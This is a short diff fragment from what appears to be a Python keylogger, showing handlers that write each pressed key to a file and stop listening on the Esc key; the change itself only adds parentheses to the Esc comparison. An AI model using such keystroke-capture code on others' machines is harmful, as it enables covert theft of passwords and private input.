@@ -26,7 +26,7 @@ def on_press(key):
     write_file(key)
 
 def on_release(key):
-    if key==Key.esc:
+    if (key) == Key.esc:
     	print("Done....")
     	return False
 print("Listening....")
